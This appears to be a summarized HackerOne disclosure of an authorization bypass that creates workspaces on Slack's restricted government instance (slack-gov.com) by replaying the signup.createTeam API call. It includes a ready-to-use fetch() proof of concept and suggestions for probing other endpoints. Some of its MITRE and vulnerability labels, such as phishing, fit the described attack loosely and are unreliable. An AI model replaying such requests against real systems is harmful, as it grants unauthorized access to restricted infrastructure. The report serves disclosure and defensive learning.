# Unauthorized Workspace Creation on GovSlack via API Endpoint Abuse

## Metadata
- **Source:** HackerOne
- **Report:** 1758174 | https://hackerone.com/reports/1758174
- **Submitted:** 2022-11-02
- **Reporter:** violet
- **Program:** Slack
- **Bounty:** Not specified in writeup
- **Severity:** high
- **Vuln:** Broken Access Control, Insufficient Authorization Validation, API Endpoint Exposure, Cross-Domain Request Forgery
- **CVEs:** None
- **Category:** auth-crypto

## Summary
A researcher discovered that the workspace creation API endpoint from slack.com (signup.createTeam) could be reused on slack-gov.com, which is a restricted government-only platform where new workspace creation is disabled for regular users. By copying the fetch request from slack.com and executing it against slack-gov.com, an attacker could create unauthorized workspaces on the government instance.

## Attack scenario
1. Attacker logs into slack.com as a regular user and initiates workspace creation
2. Attacker captures the signup.createTeam API request and its multipart form-data payload using browser developer tools
3. Attacker logs into slack-gov.com (which restricts workspace creation in the UI)
4. Attacker modifies the captured fetch request, replacing slack.com with slack-gov.com
5. Attacker executes the modified fetch request in the browser console against slack-gov.com
6. slack-gov.com API processes the request without proper authorization checks and creates a new workspace

## Root cause
The signup.createTeam API endpoint on slack-gov.com lacks proper authorization validation to enforce that only privileged users can create workspaces. The endpoint relies on client-side UI restrictions rather than server-side access control, allowing direct API calls to bypass the disabled workspace creation feature.

## Attacker mindset
An attacker would recognize that government infrastructure (slack-gov.com) intentionally restricts workspace creation to maintain control and security. By observing that the same API endpoint exists across both instances, they would test whether the backend enforces the same restrictions, discovering that API-level authorization checks were missing.

## Defensive takeaways
- Implement server-side authorization checks for all API endpoints, not relying on UI restrictions
- Validate user permissions and tenant constraints at the API layer before processing sensitive operations like workspace creation
- Apply stricter authentication/authorization policies to government and restricted-access instances
- Implement rate limiting and anomaly detection for API calls that create infrastructure resources
- Ensure API endpoints are instance-aware and enforce instance-specific business rules
- Use different API endpoints or token scopes for different Slack instances (public vs. government)
- Implement audit logging for workspace creation events, especially on restricted instances

## Variant hunting
Check other Slack instances (enterprise, federation, etc.) for similar API endpoints that bypass UI-level restrictions. Test other administrative operations (user creation, permission changes, team configuration) across different Slack deployment tiers. Examine if other Slack API endpoints in signup.* namespace have similar authorization bypass vulnerabilities.

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1078 - Valid Accounts
- T1566 - Phishing
- T1550 - Use Alternate Authentication Material

## Notes
This is a classic authorization bypass vulnerability where the frontend (UI) and backend (API) have inconsistent security controls. The government Slack instance has intentional restrictions that attackers circumvented by directly calling the API, suggesting this may have been a compliance/audit boundary enforcement that was missed during security architecture review.

## Full report
<details><summary>Expand</summary>

Head to slack.com (I use firefox), login as a user that hasn't used slack, create a workspace, copy the payload as fetch.  In my case:

```
await fetch("https://slack.com/api/signup.createTeam?_x_id=noversion-1667355054.372", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "multipart/form-data; boundary=---------------------------34111059701841183173198228768",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin"
    },
    "referrer": "https://slack.com/get-started",
    "body": "-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"email_misc\"\r\n\r\ntrue\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"tz\"\r\n\r\nAmerica/Los_Angeles\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"locale\"\r\n\r\nen-US\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"last_tos_acknowledged\"\r\n\r\ntos_mar2018\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"login\"\r\n\r\ntrue\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"in_setup_experiment\"\r\n\r\ntrue\r\n-----------------------------34111059701841183173198228768--\r\n",
    "method": "POST",
    "mode": "cors"
});
```

Login to slack-gov.com, where the option to create a workspace for new users is disabled.  Send this same fetch request, replacing slack.com with slack-gov.com.  In my case, the workspace created is viomck.slack-gov.com.

## Impact

Unauthorized access to GovSlack.

</details>

---
*Analysed by Claude on 2026-05-24*
